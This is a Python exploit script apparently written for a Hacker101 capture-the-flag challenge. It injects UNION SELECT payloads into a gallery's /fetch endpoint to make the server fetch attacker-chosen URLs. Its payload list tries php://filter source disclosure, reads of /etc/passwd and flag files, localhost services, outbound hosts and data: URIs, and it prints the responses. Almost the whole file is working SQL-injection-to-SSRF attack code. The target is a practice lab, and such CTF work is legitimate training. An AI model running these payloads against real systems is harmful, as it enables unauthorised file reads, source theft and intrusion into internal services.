#!/usr/bin/env python3
"""SSRF via UNION SELECT on the Magical Image Gallery /fetch endpoint.

Hypothesis: query is `SELECT url FROM images WHERE id = $id`, and the
resulting url is server-side fetched (file_get_contents / urllib).
UNION SELECT with a crafted URL lets us pick WHAT the server fetches.
500 => fetch failed (bad path / blocked URL); 200 => it worked.
"""
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"
SLEEP = 0.6
TIMEOUT = 10
MAX_RETRIES = 3


def probe(url_value: str, get_body: bool = False):
    """fetch?id=999 UNION SELECT '<url_value>' — returns (status, body)."""
    payload = f"%27{urllib.parse.quote(url_value, safe='')}%27"
    url = f"{BASE}/fetch?id=999+UNION+SELECT+{payload}"
    for attempt in range(MAX_RETRIES):
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                body = resp.read() if get_body else b""
                return resp.getcode(), body
        except urllib.error.HTTPError as e:
            body = e.read() if get_body else b""
            return e.code, body
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return 0, b""
            time.sleep(1.5)
    return 0, b""


candidates = [
    # php://filter — reveal source code if PHP
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=common.php",
    "php://filter/convert.base64-encode/resource=app.py",
    "php://filter/convert.base64-encode/resource=main.py",
    "php://filter/convert.base64-encode/resource=db.php",
    "php://filter/convert.base64-encode/resource=server.py",
    # local files
    "file:///etc/passwd",
    "file:///flag",
    "file:///flag.txt",
    "/flag",
    "/flag.txt",
    "/etc/passwd",
    # localhost http
    "http://127.0.0.1/",
    "http://127.0.0.1:80/flag",
    "http://localhost/flag",
    "http://127.0.0.1:5000/",
    # echo/oracle URLs (see whether outbound works at all)
    "http://example.com/",
    "https://example.com/",
    "http://httpbin.org/get",
    "http://1.1.1.1/",
    # data: scheme
    "data://text/plain;base64,SEVMTE8=",
    "data:text/plain,hello",
]

print(f"target: {BASE}\n")
for c in candidates:
    code, _ = probe(c)
    print(f"  {code:>4}  {c}")
    time.sleep(SLEEP)

print("\n--- body probes (only for 200 hits) ---")
for c in ["php://filter/convert.base64-encode/resource=index.php",
          "http://example.com/",
          "data://text/plain;base64,SEVMTE8="]:
    code, body = probe(c, get_body=True)
    print(f"  {code:>4}  {c}  -> {body[:200]!r}")
    time.sleep(SLEEP)